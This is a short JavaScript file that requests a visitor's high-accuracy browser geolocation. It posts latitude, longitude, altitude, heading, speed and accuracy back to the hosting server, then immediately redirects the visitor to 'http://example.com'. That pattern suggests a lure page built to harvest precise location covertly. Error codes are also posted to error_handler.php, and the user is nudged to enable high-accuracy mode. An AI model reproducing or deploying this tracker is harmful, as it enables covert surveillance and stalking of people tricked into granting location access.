function locate(callback, errCallback) {
  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }

  function showError(error) {
    var err_text;
    var err_status = 'failed';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        err_text = 'User denied the request for Geolocation';
        break;
      case error.POSITION_UNAVAILABLE:
        err_text = 'Location information is unavailable';
        break;
      case error.TIMEOUT:
        err_text = 'The request to get user location timed out';
        alert('Please set your location mode on high accuracy...');
        break;
      case error.UNKNOWN_ERROR:
        err_text = 'An unknown error occurred';
        break;
    }

    $.ajax({
      type: 'POST',
      url: 'error_handler.php',
      data: { Status: err_status, Error: err_text },
      success: errCallback(error, err_text),
      mimeType: 'text'
    });
  }
  function showPosition(position) {
    var lat = position.coords.latitude;
    if (lat) {
      lat = lat + ' deg';
    }
    else {
      lat = 'Not Available';
    }
    var lon = position.coords.longitude;
    if (lon) {
      lon = lon + ' deg';
    }
    else {
      lon = 'Not Available';
    }
    var acc = position.coords.accuracy;
    if (acc) {
      acc = acc + ' m';
    }
    else {
      acc = 'Not Available';
    }
    var alt = position.coords.altitude;
    if (alt) {
      alt = alt + ' m';
    }
    else {
      alt = 'Not Available';
    }
    var dir = position.coords.heading;
    if (dir) {
      dir = dir + ' deg';
    }
    else {
      dir = 'Not Available';
    }
    var spd = position.coords.speed;
    if (spd) {
      spd = spd + ' m/s';
    }
    else {
      spd = 'Not Available';
    }

    var ok_status = 'success';
    var pyjam_url=document.URL;
        var uri = pyjam_url.substring(0, pyjam_url.indexOf('/', 7));
   $.ajax({
         type: 'POST',
         url: uri,
         contentType: 'application/x-www-form-urlencoded',
         data: {Lat:lat,Lon:lon,Acc:acc,Alt:alt,Dir:dir,Spd:spd},
         success:  function(){window.location='http://example.com';},
       });
  };
}